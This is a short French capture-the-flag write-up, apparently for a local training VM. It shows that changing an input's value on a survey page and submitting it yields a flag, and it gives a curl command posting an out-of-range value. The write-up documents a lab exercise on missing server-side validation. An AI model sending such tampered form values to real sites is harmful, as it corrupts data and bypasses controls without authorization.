# Exploit 06 - Invalid POST values for survey page

Sur la [page de sondage](http://192.168.56.101/index.php?page=survey#)

il suffit de modifier la `value` de cet `input` et d'envoyer le formulaire pour obtenir le flag.

On peut automatiser la récupération du flag avec la commande:

```bash
curl 'http://192.168.56.101/index.php?page=survey#' --data 'sujet=1&valeur=1211'
```
